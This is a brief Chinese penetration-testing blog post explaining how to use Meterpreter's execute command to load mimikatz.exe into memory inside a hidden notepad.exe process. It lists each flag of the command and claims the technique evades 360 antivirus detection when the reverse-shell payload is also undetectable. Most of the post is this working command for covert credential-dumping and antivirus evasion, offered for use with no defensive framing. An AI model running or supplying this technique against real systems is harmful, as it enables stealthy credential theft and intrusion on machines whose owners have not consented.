---
title: "Meterpreter 内存加载执行"
date: 2019-07-21T00:00:00+08:00
draft: false
tags: ['metasploit','bypass']
categories: ['内网渗透','bypass']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

具体原理和进程注入类似, 先创建一个正常的进程, 然后把这个进程里的内存空间覆盖成我们想要执行的程序.

Meterpreter 方式.

<!--more-->

```
execute -H -m -d notepad.exe -f mimikatz.exe -i
```

`-H` 隐藏窗口.

`-m` 在内存中执行.

`-d` 指定覆盖进程 (dummy).

`-f` 指定执行程序 (本地文件).

`-i` 与该程序交互 (可选).

`-a` 传递参数 (可选).

在实际测试中能够绕过 360 的检测, 当然前提是你反弹会话的 payload 是免杀的.